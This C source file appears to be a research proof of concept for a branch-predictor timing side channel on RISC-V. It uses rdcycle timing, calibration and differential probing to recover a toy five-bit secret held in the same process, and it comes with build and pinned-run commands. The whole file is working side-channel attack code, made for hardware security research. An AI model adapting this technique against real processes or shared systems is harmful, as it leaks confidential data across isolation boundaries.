// brad_v1_rdcycle_diffprobe.c
// BRAD-v1 minimal modified to use rdcycle for timing (cycle counts)
// with differential probing: measure spy(1) and spy(0) and pick faster.
//
// Compile for RISC-V target (Linux):
//   riscv64-linux-gnu-gcc -O2 -static -o brad_v1_rdcycle_diffprobe brad_v1_rdcycle_diffprobe.c
// Run pinned: taskset -c 0 ./brad_v1_rdcycle_diffprobe

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

#define SECRET_LEN 5
#define ATTACK_ROUNDS 50      
#define TRAINING_REPS 2       
#define CAL_SAMPLES 200
#define PROBE_SAMPLES 200

// Victim secret 
volatile uint8_t sec[SECRET_LEN] = {1,0,0,1,0};

// Spy data 
volatile uint8_t array1[1] = {1};

// condBranch: check byte at addr
void condBranch(uint8_t *addr) {
    if (*addr) {
        asm("nop ; nop\n");
    } else {
        asm(" addi t1 , zero , 2\n");
    }
}

// victim and spy wrappers
void victim_f(unsigned idx) {
    condBranch((uint8_t*)&sec[idx]);
}

void spy_f(unsigned idx) {
    (void)idx;
    condBranch((uint8_t*)&array1[0]);
}

// rdcycle-based timestamp (serialized)
static inline uint64_t time(void) {
    uint64_t v;
    asm volatile("fence iorw, iorw" ::: "memory");
    asm volatile("rdcycle %0" : "=r"(v));
    asm volatile("fence iorw, iorw" ::: "memory");
    return v;
}

/* Differential probe: measure spy for value 1 and value 0 (each PROBE_SAMPLES times)
   Return 1 if spy(1) is faster, else 0.
*/
static int measure_and_choose(unsigned probe_samples) {
    uint64_t sum1 = 0;
    uint64_t sum0 = 0;
    uint64_t t0, t1;

    // measure spy when array1[0] = 1
    array1[0] = 1;
    for (unsigned i = 0; i < probe_samples; ++i) {
        t0 = time();
        spy_f(0);
        t1 = time();
        sum1 += (t1 - t0);
    }

    // measure spy when array1[0] = 0
    array1[0] = 0;
    for (unsigned i = 0; i < probe_samples; ++i) {
        t0 = time();
        spy_f(0);
        t1 = time();
        sum0 += (t1 - t0);
    }

    // lower average -> faster -> indicates predictor favored that outcome
    // If tie, return 0 arbitrarily.
    return (sum1 < sum0) ? 1 : 0;
}

int main(void) {
    printf("BRAD-v1 minimal using rdcycle (cycles) with differential probing\n");
    printf("Secret (ground truth): ");
    for (unsigned i = 0; i < SECRET_LEN; ++i) printf("%u ", sec[i]);
    printf("\n\n");

    double calib_mean_taken[SECRET_LEN];
    double calib_mean_not[SECRET_LEN];

    for (unsigned idx = 0; idx < SECRET_LEN; ++idx) {

        // -------------------------
        //  Calibration (unchanged)
        // -------------------------
        // Force taken
        {
            uint8_t saved = sec[idx];
            sec[idx] = 1;

            for (unsigned t = 0; t < 100; ++t) {
                for (unsigned r = 0; r < TRAINING_REPS; ++r) {
                    victim_f(idx);
                }
            }

            uint64_t sum_cycles = 0;
            for (unsigned s = 0; s < CAL_SAMPLES; ++s) {
                uint64_t t0 = time();
                spy_f(0);
                uint64_t t1 = time();
                sum_cycles += (t1 - t0);
            }
            calib_mean_taken[idx] = (double)sum_cycles / (double)CAL_SAMPLES;

            sec[idx] = saved; 
        }

        // Force not-taken
        {
            uint8_t saved = sec[idx];
            sec[idx] = 0;

            for (unsigned t = 0; t < 100; ++t) {
                for (unsigned r = 0; r < TRAINING_REPS; ++r) {
                    victim_f(idx);
                }
            }

            uint64_t sum_cycles = 0;
            for (unsigned s = 0; s < CAL_SAMPLES; ++s) {
                uint64_t t0 = time();
                spy_f(0);
                uint64_t t1 = time();
                sum_cycles += (t1 - t0);
            }
            calib_mean_not[idx] = (double)sum_cycles / (double)CAL_SAMPLES;

            sec[idx] = saved;
        }

        double threshold = (calib_mean_taken[idx] + calib_mean_not[idx]) / 2.0;
        printf("Index %u calibration: mean_taken=%.2f cycles, mean_not=%.2f cycles, threshold=%.2f cycles\n",
               idx, calib_mean_taken[idx], calib_mean_not[idx], threshold);

        // -------------------------
        // Attack: train with real secret and probe; repeat ATTACK_ROUNDS times and decide by majority
        // (uses differential probing per round)
        // -------------------------
        unsigned recovered_count1 = 0;
        for (unsigned k = 0; k < ATTACK_ROUNDS; ++k) {

            for (unsigned j = 0; j < TRAINING_REPS; ++j) {
                victim_f(idx);
            }

            // Differential probing: measure spy(1) and spy(0) and choose faster
            int rec = measure_and_choose(PROBE_SAMPLES);
            if (rec) recovered_count1++;
        }

        int recovered_bit = (recovered_count1 > (ATTACK_ROUNDS / 2)) ? 1 : 0;
        printf("Index %u: mean_taken=%.2f mean_not=%.2f threshold=%.2f -> recovered_count1=%u/%u => recovered=%d (actual=%u)\n\n",
               idx, calib_mean_taken[idx], calib_mean_not[idx], threshold, recovered_count1, ATTACK_ROUNDS, recovered_bit, sec[idx]);
    }

    return 0;
}